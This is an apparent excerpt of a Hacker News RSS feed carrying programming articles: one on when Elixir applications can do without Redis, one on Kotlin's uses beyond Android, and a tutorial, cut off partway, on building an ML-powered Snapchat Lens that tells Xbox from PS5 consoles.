<p>Click here to visit the <a href="https://www.amazon.com/gp/product/0679778314/ref=as_li_tl?ie=UTF8&amp;tag=adamfaliq-20&amp;camp=1789&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=0679778314&amp;linkId=f91ed3fc15e31ad1717ecbdfd6f6d31f">Amazon book page</a> (affiliate link), where it is available in multiple formats.</p>



<p>Like this post? Write a comment below and let me know what you think!</p>
			</div><!-- .entry-content -->

	<!-- .entry-footer -->

		<!-- .entry-auhtor -->
</article></div>]]>
            </description>
            <link>https://adamfaliq.com/2020/11/12/zen-tennis/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25070242</guid>
            <pubDate>Thu, 12 Nov 2020 14:31:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[You may not need Redis with Elixir]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25070203">thread link</a>) | @rkangel
<br/>
November 12, 2020 | https://dashbit.co/blog/you-may-not-need-redis-with-elixir | <a href="https://web.archive.org/web/*/https://dashbit.co/blog/you-may-not-need-redis-with-elixir">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <article>
    
<ul>
  <li>
    <i></i> José Valim
  </li>
  <li>
    <i></i> November 11th, 2020
  </li>
  <li>
    <i></i><a href="https://dashbit.co/blog/tags/redis">redis</a>, <a href="https://dashbit.co/blog/tags/phoenix">phoenix</a>, <a href="https://dashbit.co/blog/tags/pubsub">pubsub</a>, <a href="https://dashbit.co/blog/tags/processes">processes</a>
  </li>
</ul>
<p>
If you have participated in a discussion about Elixir, you may have heard “you may not need Redis with Elixir”. Given that Redis has many use cases, this sentence may confuse developers as they try to match Elixir’s different features against Redis’ capabilities. This article aims to explore different scenarios where the above is true, when they are not, and which trade-offs you may want to consider. We will discuss four cases:</p>
<ol>
  <li>
<a href="#post-pubsub">Distributed PubSub</a>  </li>
  <li>
<a href="#post-presence">Presence</a>  </li>
  <li>
<a href="#post-caching">Caching</a>  </li>
  <li>
<a href="#post-async">Asynchronous processing</a>  </li>
</ol>
<p>
Before we start, I want to emphasize we find Redis a fantastic piece of technology. This is not a critique of Redis but rather a discussion of the different options Elixir developers may have available.</p>
<h2 id="post-pubsub">
  Case #1: Distributed PubSub</h2>
<p>
The first scenario where you may not need Redis with Elixir is Distributed <a href="https://en.wikipedia.org/wiki/Publish%E2%80%93subscribe_pattern">PubSub</a>. Throughout this section, we will consider PubSub systems to provide <strong>at-most-once delivery</strong>: they broadcast events to the currently available subscribers. If a subscriber is not around, they won’t receive the message later.</p>
<p>
For this reason, PubSub systems are often paired with databases to offer persistence. For example, every time someone sends a message in a chat application, the system can save the contents to the database and then broadcast it to all users. This means everyone connected at a given moment sees the update immediately, but disconnected users can catch up later.</p>
<p>
Imagine that you have multiple nodes, and you want to exchange messages between said nodes. In Elixir, thanks to the Erlang VM, which ships with distribution support, this can be as simple as:</p>
<pre><code><span>for</span><span> </span><span>node</span><span> </span><span>&lt;-</span><span> </span><span>Node</span><span>.</span><span>list</span><span data-group-id="8737372369-1">(</span><span data-group-id="8737372369-1">)</span><span> </span><span data-group-id="8737372369-2">do</span><span>
  </span><span>send</span><span data-group-id="8737372369-3">(</span><span data-group-id="8737372369-4">{</span><span>:known_name</span><span>,</span><span> </span><span>node</span><span data-group-id="8737372369-4">}</span><span>,</span><span> </span><span>:hello_world</span><span data-group-id="8737372369-3">)</span><span>
</span><span data-group-id="8737372369-2">end</span></code></pre>
<p>
In <a href="https://github.com/phoenixframework/phoenix_pubsub/blob/master/lib/phoenix/pubsub.ex">200LOC or less</a>, you can implement a PubSub system that broadcasts to all subscribers within the same node or anywhere else in a cluster, without bringing any third-party tools. At best, you will need <a href="https://github.com/bitwalker/libcluster">libcluster</a> - an Elixir library - to establish the connection between the nodes based on some strategy (K8s, AWS, DNS, etc.).</p>
<p>
In other words, PubSub pretty much ships out of the box with Elixir. Technologies without distribution would need to rely on Redis PubSub, PostgreSQL Notifications, or similar to achieve the same.</p>
<p>
Of course, the above assumes your infrastructure allows you to directly establish connections between nodes, which may not be possible in some PaaS, such as Heroku. In those cases, you can use any of the technologies above (Phoenix <a href="https://dashbit.co/blog/github.com/phoenixframework/phoenix_pubsub_redis/">has a Redis adapter</a> for its PubSub), or alternatively use platforms, such as <a href="https://www.gigalixir.com/">Gigalixir</a>, that make it trivial to setup a cluster.</p>
<h2 id="post-presence">
  Case #2: Presence</h2>
<p>
Presence is the ability to track who is connected in a cluster right now — the “who” may be users, phones, IoT devices, etc. For example, if Alice is connected to node A, she wants to see that Bob is also available, even if he has joined node B.</p>
<p>
Presence is one of the problems that are more complicated to implement than it sounds. For example, let’s consider implementing Presence by storing the connected entities in a database. However, what happens if a node crashes or leaves the cluster? Because the node crashed, all the users connected to it must be removed, but the node itself cannot do so. Therefore the other nodes need to detect those failure scenarios and act accordingly. But observing failures in a distributed system is also complicated: how do you differentiate between a temporarily unresponsive node from one that permanently failed?</p>
<p>
Another common approach to solve this problem is to frequently write to a database while users are connected. If you have seen no writes within a timeframe, you consider those users to be disconnected. However, such solutions have to choose between being write-intensive or inaccurate. For instance, let’s say that users become disconnected after 1 minute. This means that you need to write to the database every 1 minute for every user. If you have 10k users, that’s 167 writes per second, only to track that the users are connected. Meanwhile, the gap between a user leaving and having their status reflected in the UI is, in the worst-case scenario, also 1 minute. Any attempt at reducing the number of writes implies an increased gap.</p>
<p>
Given Elixir’s clustering support, we can once more implement <a href="https://hexdocs.pm/phoenix/Phoenix.Presence.html">Presence</a> without a need for third-party dependencies! We use a PubSub system to implement Presence, as we need to notify as users join and leave. Instead of relying on centralized storage, the nodes directly communicate and exchange information about who is around. This removes the need for frequent writes. When a user leaves, this is also reflected immediately.</p>
<p>
So while you can use Redis or another storage to provide Presence, Elixir can deliver a solution that is efficient and doesn’t require third-party tools.</p>
<h2 id="post-caching">
  Case #3: Caching</h2>
<p>
The solutions to previous cases were built on top of Erlang’s unique distribution capabilities. In the following sections, the distinguishing factor between needing Redis or not will be <strong>multi-core concurrency</strong>, so this discussion is more generally applicable. Therefore, when we say Elixir in this section, it will also apply to JVM, Go, and other environments. They will contrast to Ruby, Python, and Node.js, in which their primary runtimes do not provide adequate multi-core concurrency within a single Operating System process.</p>
<p>
Let’s start with the non-concurrent scenario. Consider you are building a web application in Ruby, Python, etc. To deploy it, you get two eight-core machines. In languages that do not provide satisfactory multi-core concurrency, a common option for deployment is to start 8 instances of your web application, one per core, on each node. Overall, you will have CxN instances, where C is the number of cores, and N is the number of nodes.</p>
<p>
Now consider a particular operation in this application that is expensive, and you want to cache its results. The easiest solution, regardless of your programming environment, is to cache it in memory. However, given we have 16 instances of this application, caching it in memory is suboptimal: we will have to perform this expensive operation at least 16 times, one for each instance. For this reason, it is widespread to use Redis, Memcached, or similar for caching in environments like Ruby, Python, etc. With Redis, you would cache it only once, and it will be shared across all instances. The trade-off is that we are replacing memory access by a network round-trip, and the latter is orders of magnitude more expensive.</p>
<p>
Now let’s consider environments with multi-core concurrency. In languages like Elixir, you start one instance per node, regardless of the number of cores, since the runtime will share memory and efficiently spread the work across all cores. When it comes to caching, keeping the cache in-memory is a much more affordable scenario, as you will only have to compute once per node. Therefore, you have the <em>option</em> to skip Redis or Memcached altogether and avoid network round-trip.</p>
<p>
Of course, this depends on how many nodes you are effectively running in production. Luckily, many companies report being able to <a href="https://dev.to/erlangsolutions/why-elixir-is-the-programming-language-you-should-learn-in-2020-5g00">run Elixir with an order of magnitude less nodes</a> than technologies they have migrated from.</p>
<p>
You can also choose a mixed approach and store the cache both in-memory and in Redis. First, you look up in memory and, if missing, you fallback to Redis. If unavailable in both, then you execute the operation and cache it in each. The critical part to highlight here is that multi-core environments give you more flexibility to tackle these problems while reducing resource utilization. In Elixir/Erlang, you can also keep the cache in memory and use PubSub to distribute it across nodes. You can see this last approach in action <a href="https://github.com/tompave/fun_with_flags">in the excellent FunWithFlags library</a>.</p>
<p>
Another trade-off to consider is that all in-memory cache will be gone once you deploy new nodes. Therefore, if you need data to persist across deployments, you will want to use Redis as a cache layer, as detailed above, or dump the cache in a storage, such as database, S3, or Redis, before each deployment.</p>
<h2 id="post-async">
  Case #4: Asynchronous processing</h2>
<p>
Another scenario you may not need Redis in Elixir is to perform asynchronous processing. Let’s continue the discussion from the previous case.</p>
<p>
In environments without or with limited multi-core concurrency, given each instance is assigned to one core, they are limited in their ability to handle requests concurrently. This has led to a common saying that “you should avoid blocking the main thread”. For example, imagine that your application has to deliver emails on sign up or generate some computationally expensive reports. While one of your 16 web instances is doing this, it cannot handle other incoming requests efficiently. For this reason, a common choice here is to move the work elsewhere, typically a background-job processing queue. First, you store the work to be done on Redis or similar. Then one of the 16 web instances (or more commonly a completely different set of workers) grabs it from the queue.</p>
<p>
In multi-core concurrent environments, requests can be handled concurrently regardless if they are doing CPU or IO work. Sending the email from the request itself won’t block other requests. Generating the report is not a problem, as requests can be served by other CPUs. These platforms typically get assigned as many requests as they can handle and they distribute the work over the machine resources. Even if you prefer to deliver emails outside of the request, in order to send an earlier response to users, you can spawn an asynchronous worker without a need to move the delivery to an external queue or to another machine. Once again, concurrency gives us a more straightforward option to tackle these scenarios.</p>
<p>
Note the Erlang VM takes care of multiplexing CPU and IO work without a need for developers to tag functions as async or similar. Workers in Erlang/Elixir are …</p></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://dashbit.co/blog/you-may-not-need-redis-with-elixir">https://dashbit.co/blog/you-may-not-need-redis-with-elixir</a></em></p>]]>
            </description>
            <link>https://dashbit.co/blog/you-may-not-need-redis-with-elixir</link>
            <guid isPermaLink="false">hacker-news-small-sites-25070203</guid>
            <pubDate>Thu, 12 Nov 2020 14:27:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Kotlin is known in Android environment, but it also performs well in other areas]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25070191">thread link</a>) | @Pabloemm
<br/>
November 12, 2020 | https://solidstudio.io/blog/what-is-kotlin-used-for.html | <a href="https://web.archive.org/web/*/https://solidstudio.io/blog/what-is-kotlin-used-for.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                
                <p>While not as revolutionary as some other programming languages, <a href="https://solidstudio.io/technologies/kotlin.html">Kotlin</a> has been steadily growing in popularity over the past couple of years.</p>
                <p><img src="https://solidstudio.io/img/blog/what-is-kotlin-used-for/kotlin-popularity.png" alt="Kotlin popularity graph"></p><p>The initial spike on May 17, 2017, was caused by the Google Android team <a href="https://blog.jetbrains.com/kotlin/2017/05/kotlin-on-android-now-official/" rel="nofollow">officially announcing</a> first-class support for Kotlin.</p>
                
                <h2>Android development</h2>
                <p>Of course, this shouldn’t be at all surprising that the majority of Kotlin development is done for <a href="https://solidstudio.io/blog/android-development-starter-pack.html">Android mobile apps</a>. Official docs encourage Kotlin usage and most SDK docs offer snippets of code in Kotlin making it very easy to get started. Growing popularity on StackOverflow means that it’s sometimes easier to find the answer to your question in Kotlin than in Java.</p>
                <p>Many big companies already switched their development to Kotlin and are amazed by the results. Big names on this list include Google and JetBrains themselves, Amazon, Netflix, Coursera and, Uber, but many smaller companies are also making the switch.</p>
                <p>See more:</p>
                <ul>
                <li><a href="https://developer.android.com/kotlin" rel="nofollow">https://developer.android.com/kotlin</a></li>
                <li><a href="https://firebase.google.com/docs/firestore/query-data/get-data#kotlin+ktx" rel="nofollow">                https://firebase.google.com/docs/firestore/query-data/get-data#kotlin+ktx</a></li>
                <li><a href="https://developer.android.com/kotlin/stories" rel="nofollow">https://developer.android.com/kotlin/stories</a></li>
                <li><a href="https://medium.com/@daveford/who-is-using-kotlin-84b11b4fb51a" rel="nofollow">https://medium.com/@daveford/who-is-using-kotlin-84b11b4fb51a</a></li>
                </ul>
                
                <h2>Cross-platform shared logic</h2>
                <p>Android development is not the only thing we can do in Kotlin though. By leveraging Kotlin Multiplatform Mobile capabilities we can create a re-usable domain logic code that can be shared between mobile apps on Android and iOS. Even though this project is still in the alpha phase, some big companies are already experimenting with this technology and the results are promising. The premise of sharing business logic between multiple platforms is very appealing both in terms of development speed as well as maintenance costs. This was clearly visible in the recent shift towards cross-platform frameworks like React Native or Flutter, but it should soon be possible to <a href="https://netflixtechblog.com/netflix-android-and-ios-studio-apps-kotlin-multiplatform-d6d4d8d25d23" rel="nofollow">do the same with Kotlin</a>.</p>
                <p>See more:</p>
                <ul>
                <li><a href="https://kotlinlang.org/lp/mobile/" rel="nofollow">https://kotlinlang.org/lp/mobile/</a></li>
                <li><a href="https://blog.jetbrains.com/kotlin/2020/08/kotlin-multiplatform-mobile-goes-alpha/" rel="nofollow">https://blog.jetbrains.com/kotlin/2020/08/kotlin-multiplatform-mobile-goes-alpha/</a></li>
                </ul>
                
                <h2>Web development</h2>
                <p>Web development is basically all JavaScript, but that does not mean other languages cannot be used for this purpose. Languages like Typescript, Elm, Clojurescript, or ReasonML are all used in Web development by transpiling them back to JavaScript. Using Kotlin/JS we can do the same with Kotlin! If you don’t want to abandon your current knowledge about React, Redux, React Router, or even styled-components, take a look at the kotlin-wrappers repository which provides wrappers for all those libraries and more.</p>
                <p>Kotlin/JS gives you all the benefits of Kotlin while still allowing you to interact with DOM or use npm packages directly inside Kotlin code.</p>
                <p>Remember Kotlin Multiplatform? It works for Kotlin/JS as well, which means the business logic can be shared between Android, iOS AND web version of your app!</p>
                <p>See more:</p>
                <ul>
                <li><a href="https://kotlinlang.org/docs/reference/js-overview.html" rel="nofollow">https://kotlinlang.org/docs/reference/js-overview.html</a></li>
                <li><a href="https://kotlinlang.org/docs/tutorials/javascript/setting-up.html" rel="nofollow">https://kotlinlang.org/docs/tutorials/javascript/setting-up.html</a></li>
                </ul>

                <h2>Backend development</h2>
                <p>By this point, you may be thinking that Kotlin is perfect for front-end parts. Turns out it is pretty nice on the backend side as well. If you’re already familiar with the usual <a href="https://solidstudio.io/technologies/java.html">Java</a> backend stack which uses Spring Boot it is very easy to make the switch to Kotlin and it’s now easier than ever to write Kotlin-idiomatic code in Spring Boot.</p>
                <p>If you’re searching for a lightweight server-side framework in Kotlin, <a href="https://ktor.io/" rel="nofollow">ktor</a> is gaining more and more traction within the community.</p>
                <p>Going all-in on Kotlin? By using multiplatform capabilities, one can easily create a full-stack application and share business logic between all frontends and backend (for things like validation logic, shared models, etc)</p>
                <p>See more:</p>
                <ul>
                <li><a href="https://spring.io/guides/tutorials/spring-boot-kotlin/" rel="nofollow">https://spring.io/guides/tutorials/spring-boot-kotlin/</a></li>
                <li><a href="https://blog.jetbrains.com/kotlin/2020/08/the-state-of-kotlin-support-in-spring/" rel="nofollow">https://blog.jetbrains.com/kotlin/2020/08/the-state-of-kotlin-support-in-spring/</a></li>
                <li><a href="https://github.com/Kotlin/kotlin-full-stack-application-demo" rel="nofollow">https://github.com/Kotlin/kotlin-full-stack-application-demo</a></li>
                </ul>
                
                <h2>Kotlin native</h2>
                <p>Sometimes we cannot, or don’t want to, use a virtual machine (JVM), for example when targeting embedded devices. That’s where Kotlin/Native comes into play.</p> 
                <p>Not only can it produce native Windows, Linux or MacOS binaries but it can even support iOS, watchOS, tvOS, and WebAssembly. It is easy to include compiled Kotlin code directly in an existing C/C++ project as well as call native code directly from Kotlin/Native.</p> 
                <p>See more:</p>
                <ul>
                <li><a href="https://kotlinlang.org/docs/reference/native-overview.html" rel="nofollow">https://kotlinlang.org/docs/reference/native-overview.html</a></li>
                <li><a href="https://www.bignerdranch.com/blog/exploring-kotlin-native-part-1/" rel="nofollow">https://www.bignerdranch.com/blog/exploring-kotlin-native-part-1/</a></li>
                </ul>
                
                <h2>Data science</h2>
                <p>Although Python is still very much dominating the data science scene, Kotlin is making its appearance here as well. If you want to leverage JVM capabilities and performance while writing concise, statically typed and null-safe code, Kotlin may be a perfect fit for you. Afraid of losing your favorite tooling? Don’t be! Kotlin kernel for Jupyter Notebook and Kotlin interpreter for Apache Zeppelin will let you do the exploratory research and data visualization within those interactive editors. Want to jump straight into deep learning? Being fully interoperation with Java libraries, Kotlin can integrate seamlessly with existing open-source projects like <a href="https://deeplearning4j.org/" rel="nofollow">https://deeplearning4j.org/</a></p>
                <p>See more:</p>
                <ul>
                <li><a href="https://kotlinlang.org/docs/reference/data-science-overview.html" rel="nofollow">https://kotlinlang.org/docs/reference/data-science-overview.html</a></li>
                <li><a href="https://github.com/Kotlin/kotlin-jupyter" rel="nofollow">https://github.com/Kotlin/kotlin-jupyter</a></li>
                </ul>
                
                <h2>Final thoughts</h2>
                <p>As we can see, Kotlin can be used for a wide variety of subjects, starting with Android development and ending among native binaries. Be aware, as some of those technologies like Kotlin Multiplatform and Kotlin/Native are still quite new and can be rough around the edges, but this wide spectrum of Kotlin capabilities shows that there is a real interest in such a versatile programming language. Both the team behind Kotlin and the community are working very hard to make this vision a reality.</p>
                <p>Since it is very easy to integrate Kotlin with Java, if you already have a Java project (maybe an Android app or a backend service), don’t be afraid to give Kotlin a try. Who knows, maybe this time it will save you from the <a href="https://en.wikipedia.org/wiki/Null_pointer#History" rel="nofollow">billion-dollar mistake</a>?</p>
                <p>Not convinced? Feel free to reach out, and we will help you make the switch to Kotlin.</p>
                
                
                
            </div></div>]]>
            </description>
            <link>https://solidstudio.io/blog/what-is-kotlin-used-for.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25070191</guid>
            <pubDate>Thu, 12 Nov 2020 14:27:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Build an AI-Powered Snapchat Lens to Classify Between Objects]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25070088">thread link</a>) | @anupamchugh
<br/>
November 12, 2020 | https://heartbeat.fritz.ai/xbox-or-ps5-enthusiast-create-an-ai-powered-snapchat-lens-with-fritz-ai-studio-471facd3aa5d | <a href="https://web.archive.org/web/*/https://heartbeat.fritz.ai/xbox-or-ps5-enthusiast-create-an-ai-powered-snapchat-lens-with-fritz-ai-studio-471facd3aa5d">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><h2 id="50e6">Computer vision — SnapML</h2><h2 id="a850">Leverage Fritz AI to quickly generate a dataset, train an image labeling model, and deploy directly to Lens Studio</h2><div><div><div><p><a href="https://medium.com/@omarmhaimdat?source=post_page-----471facd3aa5d--------------------------------" rel="noopener"><img alt="Omar M’Haimdat" src="https://miro.medium.com/fit/c/96/96/1*XIWnqvdaUXa8QjxlXcDSnw.jpeg" width="48" height="48"></a></p></div></div></div></div></div><div><div><p id="c3c3">The Playstation 5 and Xbox Series X are coming out just in time for the holidays. If Sony fans and Microsoft fans have already made their choice, some are still hesitating. Both Sony and Microsoft offer next-gen consoles with exclusive games and subscription-based services.</p><p id="fc72">So I thought, in honor of the next generation of gaming…why not create a Snapchat Lens that will classify either console and change the camera overlay accordingly?</p><p id="5c18">If you’ve never heard of <a href="https://lensstudio.snapchat.com/" rel="noopener">Snapchat’s Lens Studio</a>, you can read my primers on both Fritz AI Studio and Lens Studio:</p><p id="7af8">In this article, I will show you how easily you can create a custom machine learning-powered Lens with <strong>almost no code</strong>. Then, we’ll create a Lens that will recognize and classify next-generation consoles (Xbox Series X and PS5).</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/6528/1*qNmI3m9KjvEvOrUlERYLjQ.png" width="3264" height="3030" srcset="https://miro.medium.com/max/552/1*qNmI3m9KjvEvOrUlERYLjQ.png 276w, https://miro.medium.com/max/1104/1*qNmI3m9KjvEvOrUlERYLjQ.png 552w, https://miro.medium.com/max/1280/1*qNmI3m9KjvEvOrUlERYLjQ.png 640w, https://miro.medium.com/max/1400/1*qNmI3m9KjvEvOrUlERYLjQ.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*qNmI3m9KjvEvOrUlERYLjQ.png?q=20"></p></div></div></div><figcaption>Figure 1: Final result</figcaption></figure></div></div></section><section></section><section><div><div><p id="5b40">First, let’s work through building a Lens Studio-ready model with <a href="https://www.fritz.ai/product/snapml.html" rel="noopener">Fritz AI Studio.</a></p><ul><li id="ce7c"><a href="https://docs.fritz.ai/dataset/seed-images/" rel="noopener"><strong>Seed images</strong></a><strong>:</strong> Download images containing the Xbox Series X and PS5, preferably with different angles and light conditions— Unfortunately, since the two consoles haven’t launched yet, you will only find generic press images. I managed to find around 15 good seed images for each class. We’ll use these “seed” images to generate a trainable dataset snapshot.</li></ul></div></div><div><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/6528/1*hnAQz_2-9xk-DJoAjcs59A.png" width="3264" height="2566" srcset="https://miro.medium.com/max/552/1*hnAQz_2-9xk-DJoAjcs59A.png 276w, https://miro.medium.com/max/1104/1*hnAQz_2-9xk-DJoAjcs59A.png 552w, https://miro.medium.com/max/1280/1*hnAQz_2-9xk-DJoAjcs59A.png 640w, https://miro.medium.com/max/1456/1*hnAQz_2-9xk-DJoAjcs59A.png 728w, https://miro.medium.com/max/1632/1*hnAQz_2-9xk-DJoAjcs59A.png 816w, https://miro.medium.com/max/1808/1*hnAQz_2-9xk-DJoAjcs59A.png 904w, https://miro.medium.com/max/1984/1*hnAQz_2-9xk-DJoAjcs59A.png 992w, https://miro.medium.com/max/2000/1*hnAQz_2-9xk-DJoAjcs59A.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*hnAQz_2-9xk-DJoAjcs59A.png?q=20"></p></div></div></div><figcaption>Figure 2: Xbox and PS5 seed images</figcaption></figure></div></div></div><div><div><ul><li id="a568"><strong>Remove the background:</strong> Plenty of services propose a way to remove image backgrounds for free, such as <a href="https://www.remove.bg/" rel="noopener">remove.bg</a> or <a href="https://clippingmagic.com/" rel="noopener">clippingmagic.com</a>. If you don’t want to use these services, <a href="https://www.adobe.com/products/photoshop.html" rel="noopener">Photoshop</a> can be used, as well as Preview (macOS only) or <a href="https://www.gimp.org/" rel="noopener">GIMP</a>. Fritz AI studio will use these images to overly them on thousands of random images.</li></ul></div></div><div><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/6528/1*UmIW-fl17TeqcBgafcKvGg.png" width="3264" height="1632" srcset="https://miro.medium.com/max/552/1*UmIW-fl17TeqcBgafcKvGg.png 276w, https://miro.medium.com/max/1104/1*UmIW-fl17TeqcBgafcKvGg.png 552w, https://miro.medium.com/max/1280/1*UmIW-fl17TeqcBgafcKvGg.png 640w, https://miro.medium.com/max/1456/1*UmIW-fl17TeqcBgafcKvGg.png 728w, https://miro.medium.com/max/1632/1*UmIW-fl17TeqcBgafcKvGg.png 816w, https://miro.medium.com/max/1808/1*UmIW-fl17TeqcBgafcKvGg.png 904w, https://miro.medium.com/max/1984/1*UmIW-fl17TeqcBgafcKvGg.png 992w, https://miro.medium.com/max/2000/1*UmIW-fl17TeqcBgafcKvGg.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*UmIW-fl17TeqcBgafcKvGg.png?q=20"></p></div></div></div><figcaption>Figure 3: Xbox and PS5 images with transparent background</figcaption></figure></div></div></div><div><div><ul><li id="7179"><strong>Annotate:</strong> When all the images are ready, go to Datasets -&gt; Add Image Collection -&gt; Upload images. When all images are uploaded, a whole new menu at the top will appear with an image annotation interface. The process is pretty simple and straightforward, especially for image labeling (classification) models. You start by creating new classes, with each one having a different color. In my case, I have two classes (xbox, ps5)—it took only few seconds using the keyboard shortcuts. You can also use this annotation workflow for other ML tasks, including object detection and image segmentation.</li></ul></div></div><div><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/5760/1*Z6xxUP6hjEtwzZUGi85C4Q.png" width="2880" height="1432" srcset="https://miro.medium.com/max/552/1*Z6xxUP6hjEtwzZUGi85C4Q.png 276w, https://miro.medium.com/max/1104/1*Z6xxUP6hjEtwzZUGi85C4Q.png 552w, https://miro.medium.com/max/1280/1*Z6xxUP6hjEtwzZUGi85C4Q.png 640w, https://miro.medium.com/max/1456/1*Z6xxUP6hjEtwzZUGi85C4Q.png 728w, https://miro.medium.com/max/1632/1*Z6xxUP6hjEtwzZUGi85C4Q.png 816w, https://miro.medium.com/max/1808/1*Z6xxUP6hjEtwzZUGi85C4Q.png 904w, https://miro.medium.com/max/1984/1*Z6xxUP6hjEtwzZUGi85C4Q.png 992w, https://miro.medium.com/max/2000/1*Z6xxUP6hjEtwzZUGi85C4Q.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*Z6xxUP6hjEtwzZUGi85C4Q.png?q=20"></p></div></div></div><figcaption>Figure 4: Annotate images — Use hotkeys to speed up the process, click (1 + e) for xbox and (2 + e) for ps5</figcaption></figure></div></div></div><div><div><ul><li id="3061"><strong>Generate a snapshot:</strong> This is where all the magic happens. With your labeled seed images, Fritz AI will create <a rel="noopener" href="https://heartbeat.fritz.ai/synthetic-data-a-bridge-over-the-data-moat-29f392a52f27"><strong>synthetic images</strong></a> based on your original images, with some sort of data augmentation built-in. You can also monitor how many images have been generated. You will receive an email when the process is finished.</li></ul></div></div><div><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/4932/1*nuHQ9QvrvzkWrReIFUNA_Q.png" width="2466" height="794" srcset="https://miro.medium.com/max/552/1*nuHQ9QvrvzkWrReIFUNA_Q.png 276w, https://miro.medium.com/max/1104/1*nuHQ9QvrvzkWrReIFUNA_Q.png 552w, https://miro.medium.com/max/1280/1*nuHQ9QvrvzkWrReIFUNA_Q.png 640w, https://miro.medium.com/max/1456/1*nuHQ9QvrvzkWrReIFUNA_Q.png 728w, https://miro.medium.com/max/1632/1*nuHQ9QvrvzkWrReIFUNA_Q.png 816w, https://miro.medium.com/max/1808/1*nuHQ9QvrvzkWrReIFUNA_Q.png 904w, https://miro.medium.com/max/1984/1*nuHQ9QvrvzkWrReIFUNA_Q.png 992w, https://miro.medium.com/max/2000/1*nuHQ9QvrvzkWrReIFUNA_Q.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*nuHQ9QvrvzkWrReIFUNA_Q.png?q=20"></p></div></div></div><figcaption>Figure 5: Snapshot image preview with three classes — Xbox, PS5 and neither</figcaption></figure></div></div></div><div><div><ul><li id="2221"><strong>Train a classification model:</strong> When the snapshot is ready, you can start the training job by selecting your snapshot and choosing the number of hours for the training budget — note that Fritz AI will send you an email when the training process is finished. It will also stop the training if the model converges before the assigned training hours.</li></ul></div></div><div><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/4748/1*4lb4Zo04zhAYhDheyMkIvw.png" width="2374" height="1118" srcset="https://miro.medium.com/max/552/1*4lb4Zo04zhAYhDheyMkIvw.png 276w, https://miro.medium.com/max/1104/1*4lb4Zo04zhAYhDheyMkIvw.png 552w, https://miro.medium.com/max/1280/1*4lb4Zo04zhAYhDheyMkIvw.png 640w, https://miro.medium.com/max/1456/1*4lb4Zo04zhAYhDheyMkIvw.png 728w, https://miro.medium.com/max/1632/1*4lb4Zo04zhAYhDheyMkIvw.png 816w, https://miro.medium.com/max/1808/1*4lb4Zo04zhAYhDheyMkIvw.png 904w, https://miro.medium.com/max/1984/1*4lb4Zo04zhAYhDheyMkIvw.png 992w, https://miro.medium.com/max/2000/1*4lb4Zo04zhAYhDheyMkIvw.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*4lb4Zo04zhAYhDheyMkIvw.png?q=20"></p></div></div></div><figcaption>Figure 6: Monitor the training process</figcaption></figure></div></div></div></section><section><div><div><p id="b09f">I am not a designer by any means—thus I’ve used <a href="https://www.canva.com/" rel="noopener">Canvas</a> to create two very simple images that will appear at the bottom of the screen to signify that you are an Xbox fan or a PS5 fan.</p></div></div><div><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/6528/1*lURKmLcxc1MqwkFuICEtbg.png" width="3264" height="958" srcset="https://miro.medium.com/max/552/1*lURKmLcxc1MqwkFuICEtbg.png 276w, https://miro.medium.com/max/1104/1*lURKmLcxc1MqwkFuICEtbg.png 552w, https://miro.medium.com/max/1280/1*lURKmLcxc1MqwkFuICEtbg.png 640w, https://miro.medium.com/max/1456/1*lURKmLcxc1MqwkFuICEtbg.png 728w, https://miro.medium.com/max/1632/1*lURKmLcxc1MqwkFuICEtbg.png 816w, https://miro.medium.com/max/1808/1*lURKmLcxc1MqwkFuICEtbg.png 904w, https://miro.medium.com/max/1984/1*lURKmLcxc1MqwkFuICEtbg.png 992w, https://miro.medium.com/max/2000/1*lURKmLcxc1MqwkFuICEtbg.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*lURKmLcxc1MqwkFuICEtbg.png?q=20"></p></div></div></div><figcaption>Figure 7: Xbox and PS5 pop up images</figcaption></figure></div></div></div></section><section></section><section><div><div><p id="cae1">Now that we have our ML model, we need to import it into Lens Studio and create our Lens.</p><ul><li id="fa96"><strong>Open the project:</strong> Open the <code>.lsproj</code> file from the project zip file provided by Fritz AI Studio. A prompt will pop up — just click on import.</li></ul><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/5760/1*o0s0XnCBPlMaDZGgSWJ_3Q.png" width="2880" height="902" srcset="https://miro.medium.com/max/552/1*o0s0XnCBPlMaDZGgSWJ_3Q.png 276w, https://miro.medium.com/max/1104/1*o0s0XnCBPlMaDZGgSWJ_3Q.png 552w, https://miro.medium.com/max/1280/1*o0s0XnCBPlMaDZGgSWJ_3Q.png 640w, 